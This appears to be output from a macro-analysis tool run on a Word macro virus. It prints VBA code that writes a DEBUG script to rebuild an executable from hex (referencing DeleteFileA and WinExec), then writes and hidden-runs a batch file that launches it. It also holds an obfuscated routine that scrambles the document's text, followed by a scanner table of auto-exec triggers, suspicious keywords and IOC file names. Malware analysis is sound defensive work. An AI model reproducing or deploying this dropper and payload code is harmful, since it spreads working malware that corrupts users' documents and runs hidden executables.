Print #hFile, "E 00000AE0 0000 436C 6F73 6548 616E 646C 6500 0000"
Print #hFile, "E 00000AF0 4578 6974 5072 6F63 6573 7300 0000 4669"
Print #hFile, "E 00000B00 6E64 436C 6F73 6500 0000 4669 6E64 4669"
Print #hFile, "E 00000B10 7273 7446 696C 6541 0000 0000 4465 6C65"
Print #hFile, "E 00000B20 7465 4669 6C65 4100 0000 4765 7443 6F6D"
Print #hFile, "E 00000B30 6D61 6E64 4C69 6E65 4100 0000 4765 7443"
Print #hFile, "E 00000B40 7572 7265 6E74 4469 7265 6374 6F72 7941"
Print #hFile, "E 00000B50 0000 0000 4765 7446 696C 6553 697A 6500"
Print #hFile, "E 00000B60 0000 4765 7453 7973 7465 6D54 696D 6500"
Print #hFile, "E 00000B70 0000 5365 7443 7572 7265 6E74 4469 7265"
Print #hFile, "E 00000B80 6374 6F72 7941 0000 0000 5769 6E45 7865"
Print #hFile, "E 00000B90 6300 0000 4669 6E64 4E65 7874 4669 6C65"
Print #hFile, "E 00000BA0 4100 0000 4D65 7373 6167 6542 6F78 4100"
Print #hFile, "E 00000BB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000BF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C00 0010 0000 2C00 0000 0C30 1130 3D30 4330"
Print #hFile, "E 00000C10 4930 4F30 5530 5B30 6130 6730 6D30 7330"
Print #hFile, "E 00000C20 7930 7F30 8530 8B30 0000 0000 0000 0000"
Print #hFile, "E 00000C30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000C90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000CF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D00 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D10 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D20 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000D90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000DF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E00 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E10 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E20 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000E90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000ED0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000EF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F00 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F10 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F20 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F30 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F40 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F50 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F60 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F70 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F80 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000F90 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FA0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FB0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FC0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FD0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FE0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000FF0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "RCX"
Print #hFile, "1550"
Print #hFile, "W"
Print #hFile, "Q"
Close hFile
End Sub
Sub startv(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "cd\"
Print #hFile, "debug < start.scr > nul"
Print #hFile, "copy start.com start.exe"
Print #hFile, "start"
Close hFile
Shell ("c:\startv.bat"), vbHide
End Sub
Sub ToolsMacro()
Beep
End Sub
Private Sub UFM6172()
FqMo10262 = MoHtEgNk & VpJj3195 & QfUmFqSz & VkVt5024
On Error GoTo Fin
Selection.WholeStory
TpIs7381 = LsPwDrRe & JqDg4903 & GmPuMwJq & EeAl8643
A$ = Selection
For a_ = 1 To Len(A$) Step 2
NzVf15868 = SmOmUsTx & JyEn16068 & Int(Rnd * 9620)
b$ = b$ + Mid(A$, a_ + 1, 1)
b$ = b$ + Mid(A$, a_, 1)
MeUf15357 = TjEqSwPy & PsUv18655 & Int(Rnd * 9092)
Next
Selection.TypeText Text:=b$
Selection.Range.Delete
Selection.HomeKey Unit:=wdStory, Extend:=wdMove
KgUkNoHi = RgOy7900 & PvTf1458
Fin:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MustDie.vbs         |Executable file name                         |
|IOC       |start.scr           |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |start.exe           |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

